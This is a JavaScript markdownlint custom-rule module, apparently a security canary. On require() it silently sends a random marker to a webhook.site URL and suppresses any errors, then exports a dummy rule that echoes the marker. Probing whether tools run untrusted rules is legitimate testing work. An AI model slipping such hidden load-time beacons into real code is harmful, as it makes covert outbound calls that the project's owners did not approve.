// RUNNERSINKS: customRules module — beacon must fire at require() time.
const crypto = require("crypto");
const MARK = "RSNK_29DBD6_MDCR_" + crypto.randomBytes(3).toString("hex");
try { require("https").get("https://webhook.site/5258ec03-cc28-4684-b688-3fef6b77607e/rsnk-md-customrule?d=" + MARK).on("error", function () {}); } catch (e) {}
module.exports = [{
  names: ["RSNK_MD_RULE"],
  description: "runnersink canary rule",
  tags: ["rsnk"],
  function: function (params, onError) { onError({ lineNumber: 1, detail: MARK }); }
}];
